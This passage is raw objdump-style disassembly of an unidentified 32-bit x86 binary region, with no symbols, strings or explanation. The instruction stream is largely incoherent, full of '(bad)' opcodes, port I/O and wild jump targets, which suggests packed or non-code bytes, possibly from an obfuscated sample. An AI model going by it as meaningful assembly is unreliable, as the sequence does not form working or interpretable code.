  40e484:	add    BYTE PTR [eax],al
  40e486:	jl     0x40e4ed
  40e488:	pop    edx
  40e489:	or     DWORD PTR [ecx+0x58e770e2],0xf8fe7130
  40e493:	adc    ebp,DWORD PTR [ebx]
  40e495:	cld    
  40e496:	out    0xbf,al
  40e498:	jno    0x40e4fa
  40e49a:	mov    bl,0x4f
  40e49c:	push   esp
  40e49d:	(bad)  
  40e49f:	in     al,dx
  40e4a0:	mov    ds:0x510c4570,al
  40e4a5:	in     eax,dx
  40e4a6:	jo     0x40e503
  40e4a8:	cmp    eax,0xc258757b
  40e4ad:	or     eax,0x5be0e0b6
  40e4b2:	aad    0x5a
  40e4b4:	and    eax,0x1e371871
  40e4b9:	div    DWORD PTR [esi]
  40e4bb:	ins    BYTE PTR es:[edi],dx
  40e4bc:	jno    0x40e52f
  40e4be:	xchg   edi,eax
  40e4bf:	pop    edx
  40e4c0:	or     BYTE PTR [edi],0x8e
  40e4c3:	loopne 0x40e4b5
  40e4c5:	pop    ebx
  40e4c6:	mov    eax,ds:0x1670fd5a
  40e4cb:	adc    al,0xe9
  40e4cd:	pusha  
  40e4ce:	mov    ah,0xeb
  40e4d0:	out    0xbb,eax
  40e4d2:	icebp  
  40e4d3:	adc    edx,DWORD PTR [ecx+0x7a]
  40e4d6:	out    dx,eax
  40e4d7:	aam    0xe8
  40e4d9:	jo     0x40e4c0
  40e4db:	or     eax,ecx
  40e4dd:	es retf 
  40e4df:	pop    edx
  40e4e0:	int    0x70
  40e4e2:	lds    edx,FWORD PTR [edi-0x3b]
  40e4e5:	imul   BYTE PTR [esi]
  40e4e7:	ins    BYTE PTR es:[edi],dx
  40e4e8:	mov    BYTE PTR ds:[eax],0x0
  40e4ec:	aas    
  40e4ed:	pop    edx
  40e4ee:	lahf   
  40e4ef:	inc    ebp
  40e4f0:	xor    dl,BYTE PTR [esp+edx*1]
  40e4f3:	jge    0x40e50f
  40e4f5:	xchg   esp,eax
  40e4f6:	lods   al,BYTE PTR ds:[esi]
  40e4f7:	dec    ebx
  40e4f8:	pop    ds
  40e4f9:	pop    edx
  40e4fa:	popf   
  40e4fb:	jle    0x40e572
  40e4fd:	pop    eax
  40e4fe:	cmp    BYTE PTR [ecx-0x63],dh
  40e501:	or     BYTE PTR [esi+0x2c6c36f6],cl
  40e507:	sbb    DWORD PTR [ecx],esi
  40e509:	adc    al,0xf2
  40e50b:	inc    ebx
  40e50c:	das    
  40e50d:	(bad)  
  40e50e:	jmp    FWORD PTR [eax-0x59ffebcd]
  40e514:	mul    DWORD PTR [ecx-0x1]
  40e517:	call   0xa507f94e
  40e51c:	pop    dx
  40e51e:	push   es
  40e51f:	jmp    0xc340d356
  40e524:	xor    ch,dh
  40e526:	call   edx
  40e528:	xor    al,BYTE PTR [edi-0x771dcabc]
  40e52e:	test   BYTE PTR ds:0x99fe5a39,bh
  40e534:	and    eax,esp
  40e536:	mul    DWORD PTR [esi]
  40e538:	lahf   
  40e539:	pop    ebp
  40e53a:	out    0xf7,eax
  40e53c:	cmp    DWORD PTR [eax+eax*1],edx
  40e53f:	loop   0x40e533
  40e541:	in     al,0x4
  40e543:	add    BYTE PTR [ebp+0x6ae90014],dh
  40e549:	dec    eax
  40e54a:	daa    
  40e54b:	test   al,0x32
  40e54d:	pop    ecx
  40e54e:	je     0x40e535
  40e550:	add    BYTE PTR [eax],al
  40e552:	ficomp DWORD PTR [ebx]
  40e554:	dec    eax
  40e555:	out    dx,al
  40e556:	fmulp  st(0),st
  40e558:	mov    bh,BYTE PTR [ecx-0x290c6f50]
  40e55e:	into   
  40e55f:	pop    ecx
  40e560:	dec    edi
  40e561:	cmp    esi,ebp
  40e563:	sub    ecx,DWORD PTR [eax-0x32]
  40e566:	fimul  WORD PTR [ebx+0x59bea184]
  40e56c:	(bad)  
  40e56d:	ror    DWORD PTR [esi-0x2b],1
  40e570:	(bad)  
  40e571:	mov    dh,0x5b
  40e573:	pop    ecx
  40e574:	data16 sbb ch,ch
  40e577:	sar    edi,cl
  40e579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e57a:	call   0x8edfdbbf
  40e57f:	pop    edx
  40e580:	je     0x40e563
  40e582:	jp     0x40e517
  40e584:	inc    esi
  40e585:	mov    ds,WORD PTR [esi-0x77ff7b74]
  40e58b:	loope  0x40e58a
  40e58d:	jmp    DWORD PTR [edx]
  40e58f:	adc    BYTE PTR [eax+0x5a],ch
  40e592:	push   eax
  40e593:	dec    edi
  40e594:	(bad)  
  40e595:	(bad)  
  40e596:	and    eax,0x4ffff5c8
  40e59b:	jmp    0x71c0ee13
  40e5a0:	inc    ebp
  40e5a1:	(bad)  
  40e5a2:	jg     0x40e57b
  40e5a4:	sub    esp,0x67
  40e5a7:	jmp    0x3d1950a9
  40e5ac:	popa   
  40e5ad:	dec    eax
  40e5ae:	mov    DWORD PTR [edi+edi*8],edx
  40e5b1:	mov    ch,0x20
  40e5b3:	loope  0x40e5b2
  40e5b5:	inc    DWORD PTR [eax]
  40e5b7:	add    BYTE PTR [edi+0x5b],bl
  40e5ba:	push   es
  40e5bb:	call   0x3e379c
  40e5c0:	and    DWORD PTR [ebx-0x16c0081a],ecx
  40e5c6:	mov    eax,DWORD PTR [ebp-0x21ea4]
  40e5cc:	test   al,0x3c
  40e5ce:	push   0x48
  40e5d0:	leave  
  40e5d1:	adc    al,0xff
  40e5d3:	mov    ch,0x20
  40e5d5:	loope  0x40e5d4
  40e5d7:	call   FWORD PTR [edi+0x5b]
  40e5da:	push   es
  40e5db:	call   0x3e371c
  40e5e0:	loope  0x40e56d
  40e5e2:	loop   0x40e5db
  40e5e4:	jg     0x40e5cf
  40e5e6:	push   0x4660f000
  40e5eb:	inc    ecx
  40e5ec:	pop    eax
  40e5ed:	jmp    0xe9c8bea5
  40e5f2:	std    
  40e5f3:	push   ebp
  40e5f5:	push   edi
  40e5f6:	out    0x11,al
  40e5f8:	push   edi
  40e5f9:	out    0xfd,eax
  40e5fb:	mov    DWORD PTR [ebp-0x40000a0d],edx
  40e601:	xchg   edx,eax
  40e602:	mov    ebx,0x6d7631f0
  40e607:	(bad)  
  40e608:	xor    DWORD PTR [ecx],eax
  40e60a:	fild   DWORD PTR [edx-0x18a7e3c]
  40e610:	(bad)  
  40e611:	ins    DWORD PTR es:[edi],dx
  40e612:	mul    BYTE PTR [ecx-0x4e]
  40e615:	and    BYTE PTR [ebx-0xa],bl
  40e618:	out    dx,al
  40e619:	out    0x2,al
  40e61b:	je     0x40e61d
  40e61d:	add    BYTE PTR [eax-0x31fffdbb],cl
  40e623:	ja     0x40e692
  40e625:	je     0x40e668
  40e627:	aad    0xd6
  40e629:	aas    
  40e62a:	into   
  40e62b:	(bad)  
  40e62c:	ins    DWORD PTR es:[edi],dx
  40e62d:	mov    ah,0xc1
  40e62f:	push   ss
  40e630:	outs   dx,BYTE PTR ds:[esi]
  40e631:	(bad)  
  40e632:	mov    esi,0x89e812a0
  40e637:	lods   eax,DWORD PTR ds:[esi]
  40e638:	ins    DWORD PTR es:[edi],dx
  40e639:	(bad)  
  40e63a:	scas   al,BYTE PTR es:[edi]
  40e63b:	loopne 0x40e69b
  40e63d:	mul    BYTE PTR [esi+0x41746e2e]
  40e643:	add    eax,0xfe963f89
  40e648:	ins    DWORD PTR es:[edi],dx
  40e649:	mov    ah,0x99
  40e64b:	(bad)  
  40e64c:	ins    DWORD PTR es:[edi],dx
  40e64d:	inc    BYTE PTR [esi-0x5217ed28]
  40e653:	lods   eax,DWORD PTR ds:[esi]
  40e654:	ins    DWORD PTR es:[edi],dx
  40e655:	(bad)  
  40e656:	jbe    0x40e670
  40e658:	dec    edi
  40e659:	imul   BYTE PTR [esi+0x66]
  40e65c:	ins    BYTE PTR es:[edi],dx
  40e65d:	mov    ah,0x4d
  40e65f:	ss ins BYTE PTR es:[edi],dx
  40e661:	(bad)  
  40e662:	pop    esi
  40e663:	rcl    BYTE PTR [ebx],0xe8
  40e666:	in     eax,0x2c
  40e668:	ins    DWORD PTR es:[edi],dx
  40e669:	dec    BYTE PTR [esi-0x80]
  40e66c:	arpl   si,si
  40e66e:	inc    esi
  40e66f:	dec    esi
  40e670:	ins    BYTE PTR es:[edi],dx
  40e671:	je     0x40e694
  40e673:	inc    ebp
  40e674:	fnstcw WORD PTR [edi]
  40e676:	ss sahf 
  40e678:	ins    BYTE PTR es:[edi],dx
  40e679:	je     0x40e6bc
  40e67b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e67c:	mov    dh,0xd7
  40e67e:	push   ds
  40e67f:	adc    al,0xa6
  40e681:	ins    DWORD PTR es:[edi],dx
  40e682:	add    BYTE PTR [eax],al
  40e684:	pop    ds
  40e685:	loope  0x40e677
  40e687:	pop    ebx
  40e688:	mov    al,ds:0xf6d9556
  40e68d:	mov    eax,ds:0x570775b0
  40e692:	nop
  40e693:	loope  0x40e708
  40e695:	push   edi
  40e696:	jge    0x40e705
  40e698:	mov    ebp,0xef6d7d63
  40e69d:	imul   edx,DWORD PTR [eax],0xffffffc1
  40e6a0:	out    0x56,eax
  40e6a2:	gs mov bh,0xca
  40e6a5:	pop    esi
  40e6a6:	pop    ebp
  40e6a7:	ins    DWORD PTR es:[edi],dx
  40e6a8:	into   
  40e6a9:	enter  0x6ca9,0xcf
  40e6ad:	push   esi
  40e6ae:	xchg   ebx,eax
  40e6af:	pop    esp
  40e6b0:	mov    edi,0x705c4556
  40e6b5:	sar    DWORD PTR ds:0x4ca0b76d,cl
  40e6bb:	jne    0x40e66c
  40e6bd:	push   esi
  40e6be:	inc    eax
  40e6bf:	xor    eax,0x6d2556f2
  40e6c4:	in     eax,0x73
  40e6c6:	adc    eax,0xc46b976d
  40e6cb:	ror    BYTE PTR [edi+0x7ec70d56],0x6c
  40e6d2:	mov    ch,0x6d
  40e6d4:	jg     0x40e72c
  40e6d6:	std    
  40e6d7:	idiv   BYTE PTR [edx+0x6b]
  40e6da:	jle    0x40e6f2
  40e6dc:	xor    DWORD PTR [eax+eiz*1],edx
  40e6df:	inc    edx
  40e6e0:	cmp    dl,BYTE PTR [esp+edi*1]
  40e6e3:	jns    0x40e72f
  40e6e5:	xchg   edx,eax
  40e6e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6e7:	outs   dx,DWORD PTR ds:[esi]
  40e6e8:	add    BYTE PTR [eax],al
  40e6ea:	enter  0x4313,0xb9
  40e6ee:	dec    edi
  40e6ef:	loopne 0x40e6d1
  40e6f1:	pop    ebx
  40e6f2:	add    al,0xd4
  40e6f4:	lds    ebp,FWORD PTR [ecx+ebp*4-0x30]
  40e6f8:	mov    esp,0xbbd6c
  40e6fd:	inc    ecx
  40e6fe:	dec    esi
  40e6ff:	int3   
  40e700:	inc    eax
  40e701:	jmp    0xd09d079b
  40e706:	repz push ebp
  40e708:	out    0x95,al
  40e70a:	xchg   DWORD PTR [esi-0x2],edx
  40e70d:	xchg   esi,eax
  40e70e:	pop    es
  40e70f:	push   cs
  40e710:	push   0xffd4cabc
  40e715:	adc    BYTE PTR [ebx],dh
  40e717:	adc    al,0x0
  40e719:	imul   ebx,DWORD PTR [edx+0x73],0x565d76fc
  40e720:	je     0x40e78f
  40e722:	push   ebp
  40e723:	loopne 0x40e72c
  40e725:	push   ecx
  40e726:	add    edx,DWORD PTR [esi]
  40e728:	call   FWORD PTR [esi+0x1b]
  40e72b:	push   ebx
  40e72c:	add    ebp,ecx
  40e72e:	out    0x8a,eax
  40e730:	jmp    0x40e79c
  40e732:	outs   dx,BYTE PTR ds:[esi]
  40e733:	pop    ecx
  40e734:	imul   ebp,ecx,0xb4fec9d8
  40e73a:	mov    edx,0x1df6f46d
  40e73f:	push   esi
  40e740:	mov    BYTE PTR [esi+edx*1-0x2170013],ah
  40e747:	xchg   esi,eax
  40e748:	addr16 gs fcmovbe st,st(4)
  40e74c:	inc    DWORD PTR [eax-0x32f30000]
  40e752:	inc    eax
  40e753:	jmp    0x1148c76d
  40e758:	iret   
  40e759:	out    dx,al
  40e75a:	(bad)  
  40e75b:	dec    BYTE PTR [edx]
  40e75d:	loopne 0x40e75a
  40e75f:	mul    BYTE PTR [ebp+ecx*1-0x18]
  40e763:	xlat   BYTE PTR ds:[ebx]
  40e764:	jb     0x40e7bc
  40e766:	(bad)  
  40e767:	mov    al,0xf7
  40e769:	adc    BYTE PTR [eax],al
  40e76b:	xor    al,0xd6
  40e76d:	push   0x5de5ad80
  40e772:	dec    dh
  40e774:	enter  0xfbcf,0x0
  40e778:	sbb    cl,ch
  40e77a:	jae    0x40e788
  40e77c:	ja     0x40e7e1
  40e77e:	push   es
  40e77f:	call   0x40eb48
  40e784:	adc    edx,ecx
  40e786:	or     eax,0xf1d85
  40e78b:	add    bh,cl
  40e78d:	push   edx
  40e78e:	test   BYTE PTR [eax],0x18
  40e791:	adc    DWORD PTR [eax],eax
  40e793:	(bad)  
  40e794:	dec    ebp
  40e795:	in     al,0xfd
  40e797:	pop    es
  40e798:	or     BYTE PTR [ecx],dl
  40e79a:	push   0x0
  40e79c:	and    dl,BYTE PTR [eax]
  40e79e:	push   0x0
  40e7a0:	xor    dl,BYTE PTR [eax]
  40e7a2:	lea    eax,[ebp+0x5c]
  40e7a5:	inc    eax
  40e7a6:	mov    eax,DWORD PTR [ebp-0x21e84]
  40e7ac:	cwde   
  40e7ad:	jmp    0x63a8e025
  40e7b2:	cli    
  40e7b3:	call   0x486e7b8
  40e7b8:	add    BYTE PTR [eax],al
  40e7ba:	ret    
  40e7bb:	shl    BYTE PTR [edx+0x5],1
  40e7be:	popa   
  40e7bf:	enter  0xffff,0x98
  40e7c3:	cmp    bl,cl
  40e7c5:	sub    cl,bl
  40e7c7:	adc    bh,bh
  40e7c9:	jne    0x40e76f
  40e7cb:	mov    eax,0xe93745cf
  40e7d0:	dec    esi
  40e7d1:	mov    ecx,DWORD PTR [eax-0x25]
  40e7d4:	xor    esp,0x1f
  40e7d7:	jmp    0xb8db38d9
  40e7dc:	mov    edi,0x87e97745
  40e7e1:	test   DWORD PTR [eax-0x1f],eax
  40e7e4:	std    
  40e7e5:	push   DWORD PTR [eax]
  40e7e7:	add    DWORD PTR [edx-0x1],eax
  40e7ea:	push   edi
  40e7eb:	ss (bad) 
  40e7ed:	addr16 mov esi,0x31003f98
  40e7f3:	ds scas eax,DWORD PTR es:[edi]
  40e7f5:	xlat   BYTE PTR ds:[ebx]
  40e7f6:	ds inc ebp
  40e7f8:	imul   edi,esi,0x195a62c4
  40e7fe:	in     al,dx
  40e7ff:	xchg   ebp,eax
  40e800:	imul   ecx,DWORD PTR [eax-0x18e724c],0x6803d826
  40e80a:	in     al,dx
  40e80b:	add    eax,0xe917ffc5
  40e810:	dec    edx
  40e811:	test   BYTE PTR [esi],0xab
  40e814:	imul   esi,DWORD PTR [ecx+edi*1-0x6b],0x4369
  40e81c:	(bad)  
  40e81d:	call   0xfe69:0xcb05847b
  40e824:	pop    ebx
  40e825:	cmp    eax,0xfc79e1da
  40e82a:	add    edi,edi
  40e82c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e82d:	aad    0x71
  40e82f:	(bad)  
  40e830:	(bad)  
  40e831:	repnz out dx,eax
  40e833:	pop    es
  40e834:	fabs   
  40e836:	mov    esi,0x7fb4c6fe
  40e83b:	out    0xc6,eax
  40e83d:	fisubr DWORD PTR [ecx-0x74]
  40e840:	lods   al,BYTE PTR ds:[esi]
  40e841:	xor    DWORD PTR [edx-0x2],esi
  40e844:	scas   al,BYTE PTR es:[edi]
  40e845:	lods   eax,DWORD PTR ds:[esi]
  40e846:	(bad)  
  40e848:	stc    
  40e849:	jnp    0x40e84d
  40e84b:	jmp    esp
  40e84d:	aad    0x71
  40e84f:	(bad)  
  40e850:	xchg   esi,eax
  40e851:	xor    dh,al
  40e853:	pop    es
  40e854:	cdq    
  40e855:	add    DWORD PTR [edi+0x7fb486fe],edi
  40e85b:	jecxz  0x40e7e3
  40e85d:	sbb    ch,BYTE PTR [edx+0x69]
  40e860:	xor    DWORD PTR [ebp+0x3cf04912],esp
  40e866:	imul   esi,DWORD PTR [ecx+ecx*4+0x5efe684a],0x4efc5c14
  40e871:	jge    0x40e897
  40e873:	imul   ecx,DWORD PTR [edi-0x63],0x533f646b
  40e87a:	int    0x77
  40e87c:	mov    ch,0x64
  40e87e:	mov    ebp,0x37000069
  40e883:	in     al,0x50
  40e885:	sbb    al,0x78
  40e887:	aad    0xe8
  40e889:	push   0x69b56bdd
  40e88e:	pop    ds
  40e88f:	push   ebx
  40e890:	sbb    edi,esp
  40e892:	push   cs
  40e893:	popf   
  40e894:	and    al,0x69
  40e896:	setge  BYTE PTR [ebx+0x50]
  40e89a:	call   DWORD PTR [edx-0x73]
  40e89d:	test   DWORD PTR [ebp-0x89682bd],edi
  40e8a3:	adc    esi,ebp
  40e8a5:	fdiv   QWORD PTR [ebx-0x188e7b70]
  40e8ab:	push   edx
  40e8ac:	call   0xa3d839a0
  40e8b1:	pop    esp
  40e8b2:	fist   WORD PTR [edx+0x5d]
  40e8b5:	add    al,0x45
  40e8b7:	in     eax,dx
  40e8b8:	rol    BYTE PTR [ebx],0x31
  40e8bb:	inc    ebx
  40e8bc:	mov    gs,WORD PTR [ecx+0x45]
  40e8bf:	and    al,0x51
  40e8c1:	cmp    ch,dh
  40e8c3:	push   edx
  40e8c4:	cmp    eax,0x3d43e569
  40e8c9:	imul   esp,DWORD PTR [edi-0x76ec4cae],0x9768e6f3
  40e8d3:	push   edx
  40e8d4:	push   ebx
  40e8d5:	pop    eax
  40e8d6:	xchg   DWORD PTR [edx+0x15],edx
  40e8d9:	imul   edi,ebp,0x3f160123
  40e8df:	push   ebx
  40e8e0:	add    eax,0xf53bbd69
  40e8e5:	push   0x526f0000
  40e8ea:	(bad)  
  40e8eb:	jnp    0x40e92f
  40e8ed:	cmp    al,0x3
  40e8ef:	scas   eax,DWORD PTR es:[edi]
  40e8f0:	leave  
  40e8f1:	push   ecx
  40e8f2:	(bad)  
  40e8f3:	pushf  
  40e8f4:	out    dx,al
  40e8f5:	dec    ecx
  40e8f6:	(bad)  
  40e8f7:	fcompp 
  40e8f9:	xchg   ebx,esp
  40e8fb:	fcompp 
  40e8fd:	push   ecx
  40e8fe:	(bad)  
  40e8ff:	push   esp
  40e900:	and    eax,0xc804c33c
  40e905:	push   ecx
  40e906:	(bad)  
  40e907:	je     0x40e89b
  40e909:	dec    edx
  40e90a:	(bad)  
  40e90b:	mov    dh,0x99
  40e90d:	enter  0xc10f,0x94
  40e911:	adc    bh,bh
  40e913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e914:	lods   eax,DWORD PTR ds:[esi]
  40e915:	nop
  40e916:	iret   
  40e917:	xchg   esi,eax
  40e918:	cdq    
  40e919:	push   edx
  40e91a:	call   FWORD PTR [edx+edx*2]
  40e91d:	mov    esp,0x8f59e900
  40e922:	(bad)  
  40e923:	cld    
  40e924:	and    bh,BYTE PTR [ecx+ebp*2]
  40e927:	mov    esp,0x3cfe5259
  40e92c:	or     BYTE PTR [edx-0x2],0x6e
  40e930:	dec    ecx
  40e931:	mov    bl,dl
  40e933:	pop    esi
  40e934:	dec    ecx
  40e935:	push   edx
  40e936:	(bad)  
  40e937:	aam    0x22
  40e939:	cmp    al,0x8b
  40e93b:	adc    al,0x58
  40e93d:	push   edx
  40e93e:	(bad)  
  40e93f:	aam    0x22
  40e941:	push   ecx
  40e942:	mov    ah,0x21
  40e944:	inc    ecx
  40e945:	push   edx
  40e946:	(bad)  
  40e947:	ds lahf 
  40e949:	sbb    eax,ebp
  40e94b:	add    DWORD PTR [eax],eax
  40e94d:	add    BYTE PTR [ebx],bl
  40e94f:	push   edx
  40e950:	(bad)  
  40e951:	cs iret 
  40e953:	imul   esi,esi,0xb0390926
  40e959:	test   eax,0x5cfe5219
  40e95e:	add    cl,BYTE PTR [edx-0x2]
  40e961:	push   cs
  40e962:	fidiv  DWORD PTR [esi+0x3f]
  40e965:	add    BYTE PTR [edi],ch
  40e967:	mov    esp,0xc43cb5fd
  40e96c:	std    
  40e96d:	push   DWORD PTR [eax]
  40e96f:	mov    al,ds:0xb94fff3e
  40e974:	mov    bl,0xe8
  40e976:	ja     0x40e931
  40e978:	std    
  40e979:	call   0x3e4146
  40e97e:	pop    edi
  40e97f:	and    edx,0xfffffff7
  40e982:	outs   dx,DWORD PTR ds:[esi]
  40e983:	mov    ecx,0xb90885e6
  40e988:	std    
  40e989:	jmp    DWORD PTR [ebp-0x20000a48]
  40e98f:	out    dx,eax
  40e990:	js     0x40e9d2
  40e992:	iret   
  40e993:	mov    eax,0xc0d4b5fd
  40e998:	std    
  40e999:	jmp    DWORD PTR [eax-0x6000c198]
  40e99f:	mov    eax,0xbdb1f843
  40e9a4:	sti    
  40e9a5:	jmp    FWORD PTR [edi-0x3f038c48]
  40e9ab:	jle    0x40e9bd
  40e9ad:	add    al,bl
  40e9af:	xadd   DWORD PTR [eax+eax*1],ecx
  40e9b3:	add    al,cl
  40e9b5:	arpl   WORD PTR [ecx-0x52bb414],cx
  40e9bb:	push   0xffffffd8
  40e9bd:	push   0x4b
  40e9bf:	jmp    ebp
  40e9c1:	dec    esp
  40e9c2:	out    0x81,al
  40e9c4:	sub    eax,0x8589fdb9
  40e9c9:	mov    eax,0x6ca075fd
  40e9ce:	cwde   
  40e9cf:	dec    eax
  40e9d0:	fst    DWORD PTR [edi+edi*8]
  40e9d3:	xor    eax,0x412fac
  40e9d8:	inc    eax
  40e9d9:	cdq    
  40e9da:	sti    
  40e9db:	jmp    FWORD PTR [edi]
  40e9dd:	mov    ecx,0x93310873
  40e9e2:	mov    BYTE PTR [edi-0x10],al
  40e9e5:	cmp    bl,dl
  40e9e7:	add    DWORD PTR [ecx],esi
  40e9e9:	cmp    eax,DWORD PTR [edx+0x654fbce7]
  40e9ef:	(bad)  
  40e9f0:	iretw  
  40e9f2:	data16 (bad) 
  40e9f4:	in     al,0x32
  40e9f6:	pop    edx
  40e9f7:	xchg   ebx,eax
  40e9f8:	adc    al,0x3a
  40e9fa:	gs enter 0x3673,0x2
  40e9ff:	push   ebp
  40ea00:	mov    edx,0x3dc38156
  40ea05:	or     bh,cl
  40ea07:	imul   esi,DWORD PTR [ecx],0xa4feb5e5
  40ea0d:	inc    ebp
  40ea0e:	pop    edx
  40ea0f:	xor    eax,0x88658664
  40ea14:	je     0x40e997
  40ea16:	jns    0x40ea4c
  40ea18:	add    BYTE PTR [eax],al
  40ea1a:	pushf  
  40ea1b:	gs ret 
  40ea1d:	(bad)  
  40ea1e:	mov    ebx,0x7027eb70
  40ea23:	cmp    eax,0x29313e82
  40ea28:	shl    DWORD PTR [edi+0x3c],0x4
  40ea2c:	(bad)  
  40ea2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea30:	jmp    0xf97e1b46
  40ea35:	mov    edi,0xe7cc5e65
  40ea3a:	mov    bh,0x84
  40ea3c:	gs (bad) 
  40ea3e:	popa   
  40ea3f:	add    al,BYTE PTR gs:[eax]
  40ea42:	(bad)  
  40ea43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea44:	fidivr DWORD PTR ds:0x50027c68
  40ea4a:	mov    dh,0x90
  40ea4c:	cli    
  40ea4d:	out    0xc1,eax
  40ea4f:	pop    ecx
  40ea50:	gs (bad) 
  40ea52:	cdq    
  40ea53:	leave  
  40ea54:	and    eax,0x3d29eff
  40ea59:	inc    esi
  40ea5a:	mov    cl,0x14
  40ea5c:	out    0x3,eax
  40ea5e:	add    al,0x4a
  40ea60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea61:	addr16 inc ebx
  40ea63:	push   esp
  40ea64:	dec    edi
  40ea65:	data16 jg 0x40eab7
  40ea68:	or     eax,0xee0cc471
  40ea6d:	lock stos DWORD PTR es:[edi],eax
  40ea6f:	dec    edi
  40ea70:	jae    0x40ead9
  40ea72:	addr16 leave 
  40ea74:	loopne 0x40ead1
  40ea76:	inc    esi
  40ea77:	adc    esi,ebp
  40ea79:	gs imul ebp
  40ea7c:	scas   eax,DWORD PTR es:[edi]
  40ea7d:	inc    edx
  40ea7e:	add    BYTE PTR [eax],al
  40ea80:	xor    dl,BYTE PTR [esp+esi*1]
  40ea83:	jns    0x40eadf
  40ea85:	xchg   ebx,eax
  40ea86:	lods   al,BYTE PTR ds:[esi]
  40ea87:	push   0xb54313c8
  40ea8c:	aaa    
  40ea8d:	leave  
  40ea8e:	lock pop ebx
  40ea90:	call   0xb9a6a8a4
  40ea95:	fdiv   DWORD PTR [edx+ebx*8-0x44be48e2]
  40ea9c:	jno    0x40eab2
  40ea9e:	adc    DWORD PTR [ecx+0x64e8d579],edi
  40eaa4:	cmp    eax,0xfec2bff0
  40eaa9:	ss push 0xf14ef7c2
  40eaaf:	inc    ebx
  40eab0:	bound  ebp,QWORD PTR ds:0x4ee6dc19
  40eab6:	test   DWORD PTR [esi-0x3ce02faa],esp
  40eabc:	(bad)  
  40eabd:	fisub  WORD PTR [ebp-0x11]
  40eac0:	ss cmp al,0xfd
  40eac3:	ffreep st(7)
  40eac5:	dec    esi
  40eac6:	inc    eax
  40eac7:	mov    ecx,0xdc4d4eff
  40eacc:	mov    dh,0x4e
  40eace:	push   ebp
  40eacf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ead0:	push   ss
  40ead1:	shr    BYTE PTR [edi-0x49593e],1
  40ead7:	mov    ecx,0x2dffd3db
  40eadc:	xchg   BYTE PTR [esi],dl
  40eade:	call   0xfe8e599a
  40eae3:	push   ds
  40eae4:	add    BYTE PTR [eax],al
  40eae6:	xchg   esi,eax
  40eae7:	dec    edx
  40eae8:	(bad)  
  40eae9:	pushf  
  40eaea:	jp     0x40eb22
  40eaec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaed:	int    0xd
  40eaef:	dec    esi
  40eaf0:	enter  0x312b,0x14
  40eaf4:	push   ebp
  40eaf5:	jb     0x40eb00
  40eaf7:	xchg   edx,eax
  40eaf8:	ret    
  40eaf9:	cmc    
  40eafa:	ins    BYTE PTR es:[edi],dx
  40eafb:	in     eax,0x69
  40eafd:	jmp    0x5d3fc97a
  40eb02:	dec    ebp
  40eb03:	ss dec eax
  40eb05:	sbb    eax,0x2c884dcc
  40eb0a:	leave  
  40eb0b:	cdq    
  40eb0c:	xor    al,0x54
  40eb0e:	adc    eax,0x5771ffd5
  40eb13:	retf   
  40eb14:	daa    
  40eb15:	sub    BYTE PTR ds:0xee93e94,ch
  40eb1b:	fldenv [edi+0x62]
  40eb1e:	fcmovnbe st,st(4)
  40eb20:	(bad)  
  40eb21:	cmp    eax,0xe9109f6d
  40eb26:	xor    bl,BYTE PTR [ecx]
  40eb28:	rcr    BYTE PTR ds:0x58e7e634,0xba
  40eb2f:	dec    esi
  40eb30:	(bad)  
  40eb31:	sbb    DWORD PTR ds:0x8c8efe4e,ecx
  40eb37:	mov    ch,0x94
  40eb39:	and    dl,dh
  40eb3b:	dec    ebp
  40eb3c:	dec    esi
  40eb3d:	outs   dx,BYTE PTR ds:[esi]
  40eb3e:	(bad)  
  40eb3f:	adc    eax,0x4ed18ae8
  40eb44:	(bad)  
  40eb45:	push   ecx
  40eb46:	std    
  40eb47:	push   cs
  40eb48:	call   DWORD PTR [esi+0x0]
  40eb4b:	add    BYTE PTR [ecx+0x14],bl
  40eb4e:	inc    esi
  40eb4f:	imul   ecx,DWORD PTR [esp+edx*1],0x8ef20075
  40eb56:	cli    
  40eb57:	xor    ebx,DWORD PTR [eax+0x7a]
  40eb5a:	std    
  40eb5b:	jmp    DWORD PTR [edi-0x48]
  40eb5e:	lock scas al,BYTE PTR es:[edi]
  40eb60:	mov    al,ds:0x57bb7350
  40eb65:	ds cli 
  40eb67:	call   FWORD PTR [ebp+0x642be649]
  40eb6d:	mov    eax,0xac65ffd
  40eb72:	rol    DWORD PTR [eax+ebx*2],0x5e
  40eb76:	mov    esp,ebp
  40eb78:	fisttp DWORD PTR [ebx+edi*8]
  40eb7b:	push   esi
  40eb7c:	mov    edi,0xb969fe6b
  40eb81:	mov    eax,0xdd600873
  40eb86:	cmp    edi,edi
  40eb88:	addr16 lahf 
  40eb8a:	inc    ebx
  40eb8b:	cld    
  40eb8c:	shr    DWORD PTR [edx],cl
  40eb8e:	jne    0x40ebb8
  40eb90:	or     DWORD PTR [eax],ebx
  40eb92:	mov    edi,DWORD PTR ds:0x410071
  40eb98:	cwde   
  40eb99:	icebp  
  40eb9a:	push   DWORD PTR [ebx+0x4d]
  40eb9d:	inc    eax
  40eb9e:	lahf   
  40eb9f:	dec    ecx
  40eba0:	dec    ecx
  40eba1:	sbb    BYTE PTR [edi-0x18],dl
  40eba4:	or     BYTE PTR [eax-0x2],cl
  40eba7:	inc    DWORD PTR [ebx]
  40eba9:	shl    DWORD PTR [edx+0x1f],1
  40ebac:	shl    BYTE PTR ds:[ecx],0x48
  40ebb0:	add    BYTE PTR [eax],al
  40ebb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebb3:	mov    al,0x4e
  40ebb5:	push   0xbeef10d8
  40ebba:	inc    eax
  40ebbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebbc:	inc    edi
  40ebbd:	inc    ecx
  40ebbe:	enter  0xfd80,0x75
  40ebc2:	sar    BYTE PTR [eax-0x4ea89cdd],1
  40ebc8:	out    0x51,al
  40ebca:	es mov cl,0xfd
  40ebcd:	jmp    0x40ec00
  40ebcf:	cmp    al,0xc8
  40ebd1:	jg     0x40ebca
  40ebd3:	cmp    dl,bh
  40ebd5:	stc    
  40ebd6:	not    esi
